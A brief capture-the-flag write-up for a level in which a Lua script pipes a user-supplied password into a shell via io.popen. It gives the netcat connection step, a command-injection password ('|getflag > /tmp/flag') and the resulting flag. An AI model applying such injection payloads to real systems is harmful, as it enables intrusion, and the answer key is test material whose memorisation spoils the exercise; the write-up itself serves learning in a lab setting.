# level11

Here, we only have a lua script that asks for a password.
But it does something interesting: `prog = io.popen("echo "..pass.." | sha1sum", "r")`.

To connect to the port used by the script: `nc 127.0.0.1 5151`

BTW, the password is `| printf 'NotSoEasy'` (it only gets you `Gz you dumb*`...).

To get the flag, type as password: `|getflag > /tmp/flag` then `cat /tmp/flag` ;)

-> `fa6v5ateaw21peobuub8ipe6s`
